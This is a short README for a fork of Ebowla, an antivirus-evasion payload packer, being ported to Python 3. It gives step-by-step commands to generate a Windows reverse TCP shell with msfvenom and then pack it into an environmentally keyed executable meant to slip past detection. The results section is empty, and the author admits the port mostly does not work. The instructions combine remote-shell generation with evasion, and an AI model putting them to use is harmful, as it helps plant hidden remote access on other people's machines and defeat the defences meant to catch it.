## Ebowla Fork to add Python3 Support
### project is currently ongoing, so obviously not everything works (honestly nothing really works)

buuuuuut if the output type is set to GO in the generic config, all compatible payload types will work (we think... maybe). What follows here definitely works and the other functionalities will follow asap. Cheers!

## How to use it (if you don't know how to use Ebowla yet)

### edit generic.config:

change:

output_type = GO

payload_type = EXE

Set at least one environment variable (computername = hostname),
the name has to be exact, as Ebowla won't decrypt otherwise.

### make payload

Make, as an example, a reverse shell payload with metersploit: 

```msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f exe -a x64 -o shell.exe```

### build executable with Ebowla

```python3 ebowla.py shell.exe genetic.config```

```./build_x64_go.sh output/<outputfilefromfirststeps> <finalfilename>```

The finished, packed executable can be found in the **output** folder.

### Results!

### without Ebowla

### same executable with the use of Ebowla
